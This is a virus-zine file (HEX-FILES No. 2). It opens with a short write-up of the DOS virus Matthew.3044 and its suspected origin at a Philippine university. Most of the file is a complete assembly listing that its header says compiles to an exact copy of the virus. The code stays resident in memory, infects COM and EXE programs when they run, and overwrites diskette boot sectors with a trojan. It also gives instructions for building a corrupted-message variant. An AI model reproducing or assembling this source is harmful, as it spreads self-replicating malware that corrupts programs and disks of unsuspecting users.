   ;
   ;   HEX-FILES No. 2                                                   File 011
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;                                 Matthew.3044
   ;
   ;
   ;     Matthew goes resident as a low memory TSR (258 paras = 9600 bytes)
   ;     and hooks int 08, 13 and 21. It infects COM and EXE programs on EXEC
   ;     (21/4B00). 3044 bytes are added to the length infected programs. EXEs
   ;     are aligned and are further padded by 1 to 15 bytes. Matthew is found
   ;     at the end of EXE programs and the start of COM programs.
   ;
   ;     Matthew drops a trojan, a message popper, on boot sectors of
   ;     diskettes on reset disk (13/0). The trojan would display a framed
   ;     message, Matthew chapter 6 verse 26, and "System Disk Needed...".
   ;
   ;     Matthew 6:26 would also be displayed on a delayed timer trigger.
   ;
   ;     One other thing about Matthew is that pairs of NOPs are hard coded.
   ;     This is probably to avoid being detected as its earlier variant.
   ;
   ;
   ;     Matthew originated from the Philippines?
   ;
   ;     You would not find in the virus code any direct reference to its
   ;     country of origin. However, I believe that Matthew was written in the
   ;     Philippines, Adamson University in particular.
   ;
   ;     It is widespread in the country considering it is not a fast
   ;     infector. Another thing is that it has many similarities with
   ;     Possessed. One obvious similarity is the int 24 handler/call to old
   ;     int 21 handler routines. I have not seen any other virii that use
   ;     these two routines, other than those based on Possessed. (I have not
   ;     seen that many virus code though) You would also find other routines
   ;     in the virus that had been influenced by Possessed.
   ;
   ;     The way I look at this, an assembly language teacher might have asked
   ;     his class to create a virus based on Possessed as their project.
   ;     Oggo, another virus based on Possessed, appeared in the wild at
   ;     almost the same time as Matthew. The authors of these two virii might
   ;     have been classmates.
   ;
   ;     If you know what "1st Bat.94 (Sw & Sh)" means, we might be able to
   ;     pin down the origin of the virus. The "1st Bat.94" might refer to
   ;     first batch 1994. The "(Sw & Sh)" part, I have no idea of.
   ;
   ;     Also, if you have a copy of Matthew.2667, there might be something
   ;     there that can give us a clue as to the origin of the virus.
   ;
   ;
   ;  ÄÄ MATT3044.ASM STARTS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    ;-------------------------------------------------------------------
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING        overwrites diskette boot sectors         WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ;-------------------------------------------------------------------
    ;
    ; Virus:  Matthew.3044
    ; Alias:  Matthew, Matthiew.3044
    ; Probable Origin: Adamson University, Manila, Philippines
    ;
    ;-------------------------------------------------------------------
    ;
    ; This source code is written in a way so that when compiled you will
    ; get an exact copy of the virus.
    ;
    ; You will only be able to duplicate the original virus if you use
    ; *TASM 2.01* or *MASM 5.0* to compile this program listing. Other
    ; compilers or versions of a compiler might produce a virus different
    ; from that originally released.
    ;
    ; This can also be compiled in a86 4.02 but you will be creating a
    ; new variant.
    ;
    ; Compile to COM.
    ;
    ;-------------------------------------------------------------------
    ; Program listing created by Putoksa Kawayan.        HEX-FILES No. 2
    ;-------------------------------------------------------------------
    ;
    ExeHeader struc
     isExeId       dw   ?
     isMod         dw   ?
     isBlocks      dw   ?
     isRelocItemCt dw   ?
     isHeaderSize  dw   ?
     isMinAlloc    dw   ?
     isMaxAlloc    dw   ?
     isSs          dw   ?
     isSp          dw   ?
     isCxSum       dw   ?
     isIp          dw   ?
     isCs          dw   ?
    ExeHeader ends

    Matthew segment 'code'
    assume cs:Matthew, ds:nothing

    MemoryMarkerLoc         equ     03ech
    SaveSsOnInt21           equ     03e8h
    SaveSpOnInt21           equ     03f0h
    VirLen                  equ     offset MatthewEntry-offset EndVirusCode
    ExecParam               equ     offset EndVirusCode+15
    MaxRow                  equ     9
    MaxColumn               equ     37

    org 100h

    MatthewEntry:
        jmp     Relay1

    ;---------------------------- this would clear the jump instructions
    ;---------------------------- if you use "type" on infected coms

                            db      13,13,32,32,32,32,10,13,10,13

    ;---------------------------- this message would be replaced with a fresh
    ;---------------------------- copy when it goes resident

    MatthewMessage label byte
      db                                        0dah,35 dup (0c4h),0bfh
      db                                        13,10,0b3h,32
      db  "Look at the birds of the air,"      ,5 dup (32),0b3h,13,10,0b3h,32
      db  "they do not sow or reap or store"   ,32,32,0b3h,13,10,0b3h,32
      db  "away in barns, yet your Heavenly"   ,32,32,0b3h,13,10,0b3h,32
      db  "Father feeds them. Are you not"     ,4 dup (32),0b3h,13,10,0b3h,32
      db  "much more valuable than they?"      ,5 dup (32),0b3h,13,10
      db                                        0c3h,35 dup (0c4h),0b4h
      db                                        13,10,0b3h,32
      db  "Matthew 6:26 1st Bat.94 (Sw & Sh)"  ,32,0b3h,13,10
      db                                        0c0h,35 dup (0c4h),0d9h

    ;---------------------------- this would end display if "type" is used

                            db      10,13,10,13,36,13,32,13,10,0,26

    ;---------------------------- virus data

    InfectMark1             dw      92a1h
    InfectMark2             dw      0505h
    VirLenConst             dw      offset EndVirusCode-offset MatthewEntry
    ExeBlk                  dw      ?
    ExeMod                  dw      ?
    ExeCs                   dw      ?
    ExeIp                   dw      ?
    ExeSs                   dw      ?
    ExeSp                   dw      ?
    ExeCxSm                 dw      ?
    CxSumVar                db      ?
    Psp                     dw      ?
              whatsthisfor1 dw      ?
    FileTypeFlag            db      ?
              whatsthisfor2 db      1

    DosInterrupt label dword
      DosIntOffset          dw      ?
      DosIntSegment         dw      ?

    ClockInterrupt label dword
      ClockIntOffset        dw      ?
      ClockIntSegment       dw      ?

    ErrorIntOffset          dw      ?
    ErrorIntSegment         dw      ?

    DiskInterrupt label dword
      DiskIntOffset         dw      ?
      DiskIntSegment        dw      ?

    Relay1:
          jmp     PrepareForSetUp

              whatsthisfor3 db      4 dup (?)

    HostProgram label dword
      HostProgramOffset     dw      ?
      HostProgramSegment    dw      ?

    VirusAsciiz             db      80 dup (?)
              whatsthisfor4 db      36
    Handle                  dw      ?
    Attribute               dw      ?
    ComLength               dw      16
    AllocatedMemory         dw      ?
    FileDate                dw      ?
    FileTime                dw      ?
    ExeLengthLo             dw      ?
    ExeLengthHi             dw      ?
    HostNameEnvSegment      dw      ?
    HostNameEnvOffset       dw      ?
    DosVersion              db      ?
    Environment             dw      ?
              whatsthisfor5 db      3 dup (?)
    ShowPayloadFlag         db      ?
    DropTrojanFlag          db      ?
    Timer                   dw      ?
    VideoPage               db      ?
    CursorPosition          dw      ?

    ;---------------------------------------- payload routines

    GetVideoMode:
          mov     ah,0fh              ; get current video mode
          int     10h                 ; and active video page
          mov     VideoPage,bh
          ret

    ReadCursorPosition:
          mov     ah,3                ; get cusor status
          mov     bh,VideoPage
          int     10h
          mov     CursorPosition,dx
          ret

    SetCursorPosition:
          mov     ah,2                ; move cursor
          mov     bh,VideoPage
          int     10h
          ret

    ReadScreen:
          mov     bh,VideoPage        ; read char and attribute
          mov     ah,8                ; at cursor position
          int     10h
          ret

    WriteScreen:
          mov     bh,VideoPage        ; write char and attribute
          mov     ah,9                ; at cursor position
          int     10h
          ret
    ;---------------------------------------- display message

    ShowPayload:
          push    cs
          pop     ds
          push    cs
          pop     es
          xor     dx,dx
          mov     di,offset MatthewMessage      ; set pointer to text
    WriteNextChar:
          call    SetCursorPosition
          mov     al,es:[di]
          mov     bl,38
          add     di,1
          call    WriteScreen                   ; and display
          add     dl,1
          cmp     dl,MaxColumn
          jb      WriteNextChar
          add     di,2
          mov     dl,0
          add     dh,1
          cmp     dh,MaxRow
          jb      WriteNextChar
          ret

    ;---------------------------------------- main payload routine

    ShowTime:
          push    cs
          pop     es
          push    cs
          pop     ds
          mov     di,offset EndVirusCode   ; set save screen buffer
          call    ReadCursorPosition       ; save current cursor location
          xor     dx,dx
          mov     cx,1                     ; start at row 0 column 1

    ;---------------------------------------- save current screen content

    SaveNextChar:
          call    SetCursorPosition        ; move cursor
          call    ReadScreen
          mov     es:[di],ax
          add     di,2
          add     dl,1
          cmp     dl,MaxColumn
          jb      SaveNextChar
          mov     dl,0
          add     dh,1
          cmp     dh,MaxRow
          jb      SaveNextChar

          xor     dx,dx
          call    SetCursorPosition

    ;---------------------------------------- show Matthew 6:26

          call    ShowPayload
          mov     ah,0
          int     16h                 ; pause

    ;---------------------------------------- restore original screen content

          xor     dx,dx
          mov     di,offset EndVirusCode        ; set pointer to screen save
    RestoreNextChar:                            ; buffer
          call    SetCursorPosition
          mov     ax,es:[di]
          mov     bl,ah
          add     di,2
          call    WriteScreen                   ; and restore
          add     dl,1
          cmp     dl,MaxColumn
          jb      RestoreNextChar
          mov     dl,0
          add     dh,1
          cmp     dh,MaxRow
          jb      RestoreNextChar
          mov     dx,CursorPosition
          call    SetCursorPosition
          ret

    ;---------------------------------------- marks memory SelfRec

    SetMemoryMark:
          push    es
          xor     ax,ax
          mov     es,ax
          mov     byte ptr es:MemoryMarkerLoc,87h
          pop     es
          ret

    ;---------------------------------------- initialize data

    InitializeClockCounter:
          mov     Timer,0
          ret

    ClearPayloadFlag:
          mov     ShowPayloadFlag,0
          ret

    Trigger             dw      -16

    ;---------------------------------------- int 8 handler

    isClock:
          pushf
          call    ClockInterrupt
          pushf
          cmp     ShowPayloadFlag,1         ; am i activating?
          je      PassToClock
          nop
          nop
          cmp     DropTrojanFlag,1          ; am i dropping trojan?
          je      PassToClock
          nop
          nop
          push    es
          push    ds
          push    di
          push    ax
          push    bx
          push    cx
          push    dx
          mov     ax,Trigger
          cmp     Timer,ax                  ; is it show time?
          jb      DoNotShowPayload
          nop
          nop
          cmp     ax,1000h                  ; is trigger at lowest limit?
          jb      GotLowerLimit             ; if yes, no reset.
          nop
          nop
          sub     Trigger,1000h             ; lessen next trigger time?
    GotLowerLimit:
          call    InitializeClockCounter    ; reset timer
          mov     ShowPayloadFlag,1         ; set showtime flag
          call    GetVideoMode              ; get video mode and screen page
          cmp     al,3                      ; are we on 80x25 text mode?
          jne     DoNotShowPayload          ; if no, no show
          nop
          nop
          call    ShowTime                  ; payload time
    DoNotShowPayload:
          add     Timer,1                   ; increment timer
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          pop     di
          pop     ds
          pop     es
          mov     ShowPayloadFlag,0         ; clear payload flag
    PassToClock:
          popf
          iret

    ;-----------------------------------------------------------------
    ; You can compare the int 24 handler and the call to the original
    ; int 21 handler to that Possessed and Oggo. Isn't it the same
    ; except for minor alterations.
    ;-----------------------------------------------------------------

    ;---------------------------------------- int 24 handler
    isError:
          xor     ax,ax
          mov     es,ax
          mov     ss,es:SaveSsOnInt21
          mov     sp,es:SaveSpOnInt21
          pop     ax
          pop     es
          pop     bp
          stc
          ret

    ;---------------------------------------- call to old dos handler
    UseDos:
          push    bp
          push    es
          push    ax
          xor     ax,ax
          mov     es,ax
          mov     es:SaveSsOnInt21,ss
          mov     es:SaveSpOnInt21,sp
          pop     ax
          pop     es
          pushf
          call    DosInterrupt
          pop     bp
          ret

    ;---------------------------------------- Matthew boot sector trojan
    isTrojan:
          jmp     TrojanStart

    DisketteBpb         db      68 dup (?)       ; diskette original bpb


    ;---------------------------------------- This is decrypted on install
    ;---------------------------------------- to get a fresh copy of the
    ;---------------------------------------- text. Possessed like, isn't it?

    ;---------------------------------------- encrypted text

    MatthewMessEncrypt label byte
    ;==========================================================================;
    ; This is the original message of Matthew.3044                             ;
    ;==========================================================================;
      db  25h,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh      ;
      db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh      ;
      db  3bh,3bh,3bh,3bh,40h,0f2h,0f5h,4ch,0dfh,0b3h,90h,90h,94h,0dfh,9eh     ;
      db  8bh,0dfh,8bh,97h,9ah,0dfh,9dh,96h,8dh,9bh,8ch,0dfh,90h,99h,0dfh      ;
      db  8bh,97h,9ah,0dfh,9eh,96h,8dh,0d3h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h  ;
      db  0f5h,4ch,0dfh,8Bh,97h,9Ah,86h,0DFh,9Bh,90h,0DFh,91h,90h,8Bh,0DFh,8Ch ;
      db  90h,88h,0DFh,90h,8Dh,0DFh,8Dh,9Ah,9Eh,8Fh,0DFh,90h,8Dh,0DFh,8Ch,8Bh  ;
      db  90h,8dh,9ah,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,9eh,88h,9eh,86h,0dfh,96h;
      db  91h,0dfh,9dh,9eh,8dh,91h,8ch,0d3h,0dfh,86h,9ah,8bh,0dfh,86h,90h,8ah  ;
      db  8dh,0dfh,0b7h,9ah,9eh,89h,9ah,91h,93h,86h,0dfh,0dfh,4ch,0f2h,0f5h    ;
      db  4ch,0dfh,0b9h,9eh,8bh,97h,9ah,8dh,0dfh,99h,9ah,9ah,9bh,8ch,0dfh,8bh  ;
      db  97h,9ah,92h,0d1h,0dfh,0beh,8dh,9ah,0dfh,86h,90h,8ah,0dfh,91h,90h,8bh ;
      db  0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,92h,8ah,9ch,97h,0dfh,92h  ;
      db  90h,8dh,9ah,0dfh,89h,9eh,93h,8ah,9eh,9dh,93h,9ah,0dfh,8bh,97h,9eh    ;
      db  91h,0dfh,8bh,97h,9ah,86h,0c0h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h ;
      db  3ch,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh  ;
      db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh  ;
      db  3bh,3bh,4bh,0f2h,0f5h,4ch,0dfh,0b2h,9eh,8bh,8bh,97h,9ah,88h,0dfh     ;
      db  0c9h,0c5h,0cdh,0c9h,0dfh,0ceh,8ch,8bh,0dfh,0bdh,9eh,8bh,0d1h,0c6h    ;
      db  0cbh,0dfh,0d7h,0ach,88h,0dfh,0d9h,0dfh,0ach,97h,0d6h,0dfh,4ch,0f2h   ;
      db  0f5h,3fh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh     ;
      db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh  ;
      db  3bh,3bh,3bh,3bh,26h                                                  ;
    ;==========================================================================;
    ;> Use this to create Matthew.3044 with the corrupted message.            <|
    ;> In some places, Matthew.3044 with corrupted message is more common.    <|
    ;> Frisk's F-Prot flags this as Matthew.3044.unknown                      <|
    ;==========================================================================;
    ;  db  25h,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,3bh,3bh,40h,0f2h,0f5h,4ch,0dfh,0b3h,90h,90h,94h,0dfh,9eh
    ;  db  8bh,0dfh,8bh,97h,9ah,0dfh,9dh,96h,8dh,9bh,8ch,0dfh,90h,99h,0dfh
    ;  db  8bh,97h,9ah,0dfh,9eh,96h,8dh,0d3h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h
    ;  db  0f5h,4ch,0dfh,43h,74h,72h,6ch,2dh,41h,6ch,74h,2dh,4ch,65h,66h,74h
    ;  db  53h,68h,69h,66h,74h,2dh,52h,69h,67h,68h,74h,53h,68h,69h,66h,74h,24h
    ;  db  8dh,9ah,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,9eh,88h,9eh,86h,0dfh,96h
    ;  db  91h,0dfh,9dh,9eh,8dh,91h,8ch,0d3h,0dfh,86h,9ah,8bh,0dfh,86h,90h,8ah
    ;  db  8dh,0dfh,0b7h,9ah,9eh,89h,9ah,91h,93h,86h,0dfh,0dfh,4ch,0f2h,0f5h
    ;  db  4ch,0dfh,0b9h,9eh,8bh,97h,9ah,8dh,0dfh,99h,9ah,9ah,9bh,8ch,0dfh,8bh
    ;  db  97h,9ah,92h,0d1h,0dfh,0beh,8dh,9ah,0dfh,86h,90h,8ah,0dfh,91h,90h,8bh
    ;  db  0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,92h,8ah,9ch,97h,0dfh,92h
    ;  db  90h,8dh,9ah,0dfh,89h,9eh,93h,8ah,9eh,9dh,93h,9ah,0dfh,8bh,97h,9eh
    ;  db  91h,0dfh,8bh,97h,9ah,86h,0c0h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h
    ;  db  3ch,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,4bh,0f2h,0f5h,4ch,0dfh,0b2h,9eh,8bh,8bh,97h,9ah,88h,0dfh
    ;  db  0c9h,0c5h,0cdh,0c9h,0dfh,0ceh,8ch,8bh,0dfh,0bdh,9eh,8bh,0d1h,0c6h
    ;  db  0cbh,0dfh,0d7h,0ach,88h,0dfh,0d9h,0dfh,0ach,97h,0d6h,0dfh,4ch,0f2h
    ;  db  0f5h,3fh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh
    ;  db  3bh,3bh,3bh,3bh,26h
    ;--------------------------------------------------------------------------;

    ;---------------------------------------- encrypted System Disk Needed...
    BootMessage label byte
       db   0f2h,0f5h,0f2h,0f5h,0ach,86h,8ch,8bh,9ah,92h,0dfh,0bbh,96h,8ch,94h
       db   0dfh,0b1h,9ah,9ah,9bh,9ah,9bh,0d1h,0d1h,0d1h,0f2h,0f5h,5dh

    ;---------------------------------------- trojan display char routine
    DisplayChar:
          mov     ah,0eh
          mov     bx,16h
          mov     cx,1
          int     10h
          ret

    ;---------------------------------------- display message on boot
    ShowBibleTract:
          mov     al,[si]
          cmp     al,5dh
          je      DonePreaching
          nop
          nop
          not     al
          call    DisplayChar
          inc     si
          jmp     ShowBibleTract
    DonePreaching:
          ret

    ;---------------------------------------- dummy for call $+3 + pop
    CallPop:
          jmp     DoPop

    TrojanStart:
          xor     ax,ax
          mov     ss,ax
          mov     sp,7c00h
          call    CallPop
    DoPop:
          pop     di
          mov     ax,(DoPop-MatthewMessEncrypt)
          sub     di,ax                        ; set offset of text
          push    cs
          pop     ds
    RepeatKuno:
          mov     si,di
          call    ShowBibleTract            ; display text
          xor     ax,ax
          int     16h                       ; pause
          int     19h                       ; load another boot sector
          jmp     RepeatKuno

    DiskBootSig         dw      0aa55h

    ;---------------------------------------- write trojan to boot sector
    WriteTrojan:
          mov     bx,offset isTrojan
          mov     ax,301h
          mov     cx,1
          mov     dh,0
          pushf
          call    DiskInterrupt
          ret

    ;---------------------------------------- preserve diskette bpb
    CopyDisketteBpb:
          mov     di,offset DisketteBpb
          mov     si,offset EndVirusCode+3
          mov     cx,(MatthewMessEncrypt-DisketteBpb)
          cld
          repe movsb
          ret

    ;---------------------------------------- read boot sector
    ReadBootSector:
          push    cs
          pop     es
          push    cs
          pop     ds
          mov     bx,offset EndVirusCode
          mov     ax,201h
          mov     cx,1
          mov     dh,0
          pushf
          call    DiskInterrupt
          ret

    DropTrojan:
          push    ax                   ; save registers
          push    bx
          push    cx
          push    dx
          push    si
          push    di
          push    ds
          push    es
          push    cs
          pop     es
          mov     DropTrojanFlag,1     ; set dropping trojan flag
          call    ReadBootSector       ; read boot sector
          call    CopyDisketteBpb      ; copy disk's bpb
          call    WriteTrojan          ; drop the trojan
          mov     DropTrojanFlag,0     ; clear dropping trojan flag
          pop     es                   ; restore registers
          pop     ds
          pop     di
          pop     si
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          ret

    ;---------------------------------------- int 8 handler
    isDisk:
          pushf
          cmp     ah,0                      ; reset disk?
          jne     PassToDisk                ; exit if no
          nop
          nop
          test    dl,80h                    ; is it a hard disk?
          jne     PassToDisk                ; if yes, exit
          nop
          nop
          cmp     dl,2                      ; drive a: or b: ?
          je      PassToDisk                ; if no, exit
          nop
          nop
          call    DropTrojan                ; then drop trojan
    PassToDisk:
          popf
          jmp     DiskInterrupt

    ;---------------------------------------- copy executing program's name
    CopyPreyNameToAsciiz:
          push    ds
          push    cs
          pop     ds
          mov     di,offset VirusAsciiz
          mov     ax,ds
          pop     ds
          mov     es,ax
          mov     si,dx
          mov     cx,80
          cld
          repe movsb
          ret

    MovePointerBegin:
          xor     cx,cx
          mov     dx,cx
          mov     ax,4200h                  ; move file pointer to
          call    UseDos                    ; start of program
          ret

    ;---------------------------------------- make fresh copy of text
    MakeDecryptedCopyOfMessage:
          push    cs
          pop     ds
          mov     cx,(BootMessage-MatthewMessEncrypt) ; set char count
          mov     di,offset MatthewMessage            ; set destination
          mov     si,offset MatthewMessEncrypt        ; set source
          cld
    DecryptAndCopy:
          mov     ax,ds
          mov     es,ax
          mov     al,[si]
          not     al                                  ; decrypt...
          mov     es:[di],al                          ; ...and copy
          inc     di
          inc     si
          loop    DecryptAndCopy
          ret

    ;---------------------------------------- write virus code
    WriteVirusToFile:
          mov     dx,offset MatthewEntry
          mov     cx,VirLenConst
          mov     ah,40h
          mov     bx,Handle
          call    UseDos
          ret

    ;---------------------------------------- check disk's free space
    CheckDiskSpace:
          mov     ah,36h
          mov     dl,0
          call    UseDos
          cmp     ax,-1                     ; error?
          jne     CheckFreeSpace
          nop
          nop
    NotEnoughSpace:
          stc
          ret

    CheckFreeSpace:
          xor     dx,dx
          mul     bx
          mul     cx
          or      dx,dx                     ; enough space?
          jne     EnoughSpace
          nop
          nop
          cmp     ax,VirLenConst            ; is it enough for me?
          jb      NotEnoughSpace
    EnoughSpace:
          ret

    ;---------------------------------------- clear buffer for decrypted
    ;---------------------------------------- for command.com
    ClearCommandComBuffer:
          push    cs
          pop     ds
          mov     cx,11
          xor     si,si
    ClearLoop:
          mov     byte ptr ds:[si+offset CommandComBuffer],9dh
          nop
          inc     si
          loop    ClearLoop
          ret

    assume cs:Matthew, ds:Matthew

    ;---------------------------------------- infection routine

    InfectExecutingProgram:
          call    CopyPreyNameToAsciiz      ; copy name of executing program
          call    ClearCommandComBuffer     ; clear command.com buffer
          mov     ax,3524h
          call    UseDos
          mov     ErrorIntSegment,es        ; save and hook error handler
          mov     ErrorIntOffset,bx
          mov     ax,2524h
          mov     dx,offset isError
          call    UseDos
          jmp     SetInfect

    assume cs:Matthew, ds:nothing

    RestoreErrorInterrupt:
          mov     ax,2524h                  ; restore int 24
          mov     dx,ErrorIntOffset
          mov     ds,ErrorIntSegment
          call    UseDos
          ret

    SetInfect:
          call    CheckDiskSpace            ; check if there's enough free space
          jc      RestoreErrorInterrupt
          mov     dx,offset VirusAsciiz
          mov     ax,4300h
          call    UseDos                    ; get file attribute
          jc      RestoreErrorInterrupt
          mov     Attribute,cx
          mov     ax,4301h
          mov     cx,20h
          call    UseDos                    ; set file attribute to normal
          jc      RestoreErrorInterrupt
          mov     ax,3d02h                  ; open file
          call    UseDos
          jc      RestoreErrorInterrupt
          mov     Handle,ax
          mov     bx,ax
          mov     ax,5700h                  ; save file time and date stamp
          call    UseDos
          mov     FileDate,dx
          mov     FileTime,cx
          mov     bx,-2                     ; allocate memory for infection
          mov     ah,48h
          call    UseDos
          jnc     EnoughMemory
          nop
          nop
          mov     ah,48h
          call    UseDos
          jc      RestoreErrorInterrupt
    EnoughMemory:
          mov     AllocatedMemory,ax
          xor     cx,cx                     ; get file length
          mov     dx,cx
          mov     bx,Handle
          mov     ax,4202h
          call    UseDos
          jc      Relay2
          nop
          nop
          mov     ComLength,ax
          call    MovePointerBegin
          jc      Relay2
          nop
          nop
          mov     cx,ComLength
          xor     dx,dx
          mov     ds,AllocatedMemory
          mov     ah,3fh                    ; read entire com file
          call    UseDos
    Relay2:
          jc      DoneWithFile
          nop
          nop
          xor     si,si
          mov     FileTypeFlag,1
          cmp     word ptr [si],'ZM'        ; is it exe?
          je      Relay4
          nop
          nop
          mov     ax,InfectMark1                      ; is com infected?
          cmp     [si+(InfectMark1-MatthewEntry)],ax
          je      Relay3
          nop
          nop
          mov     ax,InfectMark2                      ; is it really infected?
          cmp     [si+(InfectMark2-MatthewEntry)],ax
          je      Relay3
          nop
          nop
          call    MovePointerBegin                    ; move pointer to start
          jmp     CheckComLength
    Relay3:
          jmp     DoneWithFile
    CheckComLength:
          mov     ax,ComLength
          add     ax,VirLenConst
          cmp     ax,0fde6h                      ; file too big?
          jnb     Relay3
          push    cs
          pop     ds
          call    WriteVirusToFile               ; infect
          mov     bx,Handle
          mov     cx,ComLength
          mov     ds,AllocatedMemory
          not     word ptr ds:[0]                ; encrypt first two bytes of
          xor     dx,dx                          ;   host and write it
          mov     ah,40h
          call    UseDos
          jmp     DoneWithFile

    Relay4:
          jmp     isExe

    DoneWithFile:
          mov     es,AllocatedMemory             ; release allocated memory
          mov     ah,49h
          call    UseDos
          mov     bx,Handle                      ; restore date and time stamp
          mov     dx,FileDate
          mov     cx,FileTime
          mov     ax,5701h
          call    UseDos
          mov     ah,3eh                         ; close file
          call    UseDos
          push    cs
          pop     ds
          mov     dx,offset VirusAsciiz
          mov     cx,Attribute                   ; restore attribute
          mov     ax,4301h
          call    UseDos
          ret

    Relay5:
          jmp     DoneWithFile

    isExe:
          mov     FileTypeFlag,0
          mov     ds,AllocatedMemory
          xor     si,si
    ;---------------------------------------- check for infection
          cmp     word ptr [si].isCxSum,2770h
          je      Relay5
          cmp     word ptr [si].isCxSum,2771h
          je      Relay5
          cmp     word ptr [si].isCxSum,2772h
          je      Relay5
          cmp     word ptr [si].isCxSum,2773h
          je      Relay5
          cmp     word ptr [si].isCxSum,2774h
          je      Relay5
          cmp     word ptr [si].isCxSum,2775h
          je      Relay5
          cmp     word ptr [si].isCxSum,2776h
          je      Relay5
          cmp     word ptr [si].isCxSum,2777h
          je      Relay5
          cmp     word ptr [si].isCxSum,2778h
          je      Relay5
          cmp     word ptr [si].isCxSum,2779h
          je      Relay5
          cmp     word ptr [si].isCxSum,277ah
          je      Relay5
          cmp     word ptr [si].isCxSum,277bh
          je      Relay5
          cmp     word ptr [si].isCxSum,277ch
          je      Relay5
          cmp     word ptr [si].isCxSum,277dh
          je      Relay5
          cmp     word ptr [si].isCxSum,277eh
          je      Relay5
          push    [si].isCxSum                   ; save checksum
          pop     ExeCxSm
          mov     word ptr [si].isCxSum,2770h
          mov     ax,[si].isSs
          add     ax,16
          mov     ExeSs,ax                       ; save header ss
          mov     ax,[si].isSp
          mov     ExeSp,ax                       ; save header sp
          mov     ax,[si].isIp
          mov     ExeIp,ax                       ; save header ip
          mov     ax,[si].isCs
          add     ax,16
          mov     ExeCs,ax                       ; save header cs
          push    [si].isBlocks
          pop     ExeBlk                         ; save block count
          push    [si].isMod
          pop     ExeMod                         ; save mod
          xor     ax,ax
          mov     al,CxSumVar                    ; all copies i've seen, this
          add     ax,2770h                       ;    is always 0
          mov     [si].isCxSum,ax                ; set infect mark
          mov     ax,[si].isBlocks
          cmp     word ptr [si].isMod,0
          je      PageAligned
          nop
          nop
          dec     ax
    PageAligned:
          mov     bx,512
          mul     bx
          add     ax,[si].isMod
          adc     dx,0
          add     ax,15                          ; align length
          adc     dx,0
          and     ax,0fff0h
          mov     ExeLengthLo,ax
          mov     ExeLengthHi,dx
          add     ax,VirLenConst
          adc     dx,0
          jc      Relay6                         ; file too big?
          nop
          nop
          div     bx
          or      dx,dx
          je      AlignedToPage
          nop
          nop
          inc     ax
    AlignedToPage:
          mov     [si].isBlocks,ax
          mov     [si].isMod,dx
          mov     ax,ExeLengthLo
          mov     dx,ExeLengthHi
          mov     bx,16
          div     bx
          sub     ax,[si].isHeaderSize
          sub     ax,16
          mov     [si].isCs,ax              ; set up vir exe header
          mov     word ptr [si].isIp,offset MatthewEntry
          mov     [si].isSs,ax
          mov     word ptr [si].isSp,offset EndVirusCode+100h
          mov     bx,Handle
          call    MovePointerBegin
          mov     cx,28
          xor     dx,dx
          mov     ah,40h                         ; write virus exe header
          call    UseDos

    assume cs:Matthew, ds:Matthew

          push    cs
          pop     ds
          mov     dx,ExeLengthLo
          mov     cx,ExeLengthHi
          mov     ax,4200h                       ; move pointer to end of file
          call    UseDos
          call    WriteVirusToFile               ; infect
    Relay6:
          jmp     DoneWithFile

    assume cs:Matthew, ds:nothing

    ;---------------------------------------- encrypted command.com

    EncryptedCommandComm  db  9ch,90h,92h,92h,9eh,91h,9bh,0d1h,9ch,90h,92h,0
                          db  '$'

    ;---------------------------------------- int 21 handler

    isDos:
          pushf
          cmp     ax,4b00h                  ; exec
          jne     PassToDos
          nop
          nop
          push    ds                        ; save registers
          push    es
          push    si
          push    di
          push    ax
          push    bx
          push    cx
          push    dx
          call    InfectExecutingProgram    ; call infection routine
          pop     dx                        ; restore registers
          pop     cx
          pop     bx
          pop     ax
          pop     di
          pop     si
          pop     es
          pop     ds
    PassToDos:
          popf                              ; execute original int handler
          jmp     DosInterrupt

    assume cs:Matthew, ds:Matthew

